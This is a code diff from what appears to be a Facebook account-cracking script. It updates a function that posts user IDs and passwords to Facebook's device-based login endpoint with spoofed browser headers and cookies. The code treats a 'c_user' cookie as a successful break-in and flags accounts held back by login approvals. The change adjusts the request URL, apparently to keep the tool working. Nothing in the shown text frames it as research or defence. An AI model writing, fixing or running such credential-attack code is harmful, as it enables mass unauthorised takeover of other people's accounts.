@@ -1397,10 +1397,6 @@ def p(uid,pwx,tl):
             'ps_n': '1',
             'fr': '0c3x4NhqzBoN0oJpn.AWVfsC_G24y6uAIoOOKvbwXSI3E.BnPBZf..AAA.0.0.BnRymx.AWXuu8K5mwU',
             'wd': '1440x802',}
-            params = {
-            'login_attempt': '1',
-            'next': 'https://www.facebook.com/v16.0/dialog/oauth?state=87d312cc-d9a6-4b70-b0ca-864a924a8bda&scope=email%2Copenid%2Cpublic_profile&response_type=code&client_id=525265914179580&redirect_uri=https%3A%2F%2Fwww.canva.com%2Foauth%2Fauthorized%2Ffacebook&ret=login&fbapp_pres=0&logger_id=f443522a-0861-462d-a090-c0c211d019a0&tp=unspecified&cbt=1732716979564',
-            'lwv': '100',}
             headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
@@ -1425,8 +1421,8 @@ def p(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
             'viewport-width': '1440',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/'
-            po = Session.post(url, params=params, cookies=cookies, data=data, headers=headers).text
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028'
+            po = Session.post(url, cookies=cookies, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
